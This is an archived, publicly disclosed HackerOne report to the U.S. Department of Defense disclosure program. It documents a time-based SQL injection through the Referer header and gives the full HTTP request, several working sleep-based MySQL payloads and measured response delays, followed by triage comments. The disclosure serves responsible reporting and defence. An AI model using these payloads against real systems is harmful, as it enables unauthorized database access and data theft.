---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
  - impact/data-exposure
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2020-10-16
submitted: 2020-09-30T19:00:04.202Z
bounty_usd: null
votes: 87
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "yassinek3ch"
source: "https://hackerone.com/reports/995122"
title: "[SQLI ]Time  Bassed Injection at ██████████ via referer header"
---
# [SQLI ]Time  Bassed Injection at ██████████ via referer header

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 87 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-10-16

- Report: [https://hackerone.com/reports/995122](https://hackerone.com/reports/995122)
- CWE: SQL Injection
- Submitted: 2020-09-30T19:00:04.202Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi

the ████ was vulnerable to time bassed injection via referer header

#steps
  
1- copy the request to your burp suite :

```GET /DNCdb.php?alert= HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
████=*
Upgrade-Insecure-Requests: 1
Referer: http://www.google.com/search?hl=en&q='+(select*from(select(sleep(7*7)))a)+' ```

the injection point is``` Referer: http://www.google.com/search?hl=en&q=*```

payload > '+(select*from(select(sleep(7*7)))a)+'  > 7*7 = 49.> 49,708 mills
█████

payload > '+(select*from(select(sleep(20)))a)+'  > 20 = 20,208 mills

██████████

payload>  '+(select*from(select(sleep(20+10)))a)+'  > 10+20=30 > 30,289 mills
██████████

## Impact

SQL Injection, attacker can dump the database of ████

## Timeline

- **Report Filed**
- **2020-09-30** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **2020-10-04** @yassinek3ch: the waf*
- **Report Severity Updated**
- **2020-10-05** @agent-l8: Thanks @yassinek3ch last week, no matter what I put in, there was no delay. Today it is responding as you described, maybe due to different network.
- **Report Triaged**
- **2020-10-06** @yassinek3ch: **no delay in the  last week  maybe because you don't add the "alert=" ,like *.php?alert=**

**you can see here without alert, code not executed**

```GET /DNCdb.php```  
```Referer: 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'```
```Time: 509millis```
█████

**with  addIng  the "alert", code has been executed**

```GET /DNCdb.php?alert=```

```Referer: 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'``` 
```Time: 25,778millis```
████████
- **Report Resolved**
- **Agreed On Going Public**
- **2020-10-16** @agent-l8: added to queue
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
